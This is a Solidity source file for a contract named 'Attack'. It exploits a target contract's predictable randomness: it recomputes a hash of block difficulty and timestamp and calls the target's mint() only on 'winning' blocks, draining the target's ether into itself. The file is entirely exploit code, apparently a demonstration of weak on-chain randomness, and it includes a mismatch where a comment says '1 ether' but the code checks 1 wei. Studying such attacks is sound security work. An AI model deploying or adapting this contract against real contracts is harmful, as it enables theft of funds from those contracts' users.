// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract Attack {
    event Log(string);

    // Attack contract, the parameter is the target contract address
    function attack(address _random) external payable {
        for (;;) {
            // If the balance of the target contract is less than 1 ether returned
            if (payable(_random).balance < 1) {
                emit Log("succeeded getting eth");
                return;
            }
            // Calculate the hash value generated by the current block's difficulty and timestamp to be used as a random number.
            // If the random number is even, it means this block is not a winner. Return and wait for the next block.
            uint256 _randomNumber = uint256(
                keccak256(abi.encodePacked(block.difficulty, block.timestamp))
            );
            if (_randomNumber % 2 == 0) {
                emit Log("failed to get rand, wait 10 seconds");
                return;
            }

            // If the random number is odd, it means this block is a winner. Call the target contract's mint function.
            (bool ok, ) = _random.call(abi.encodeWithSignature("mint()"));
            if (!ok) {
                emit Log("failed to call mint()");
                return;
            }
        }
    }

    // Check Balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // Receive Eth by attack
    receive() external payable {}
}
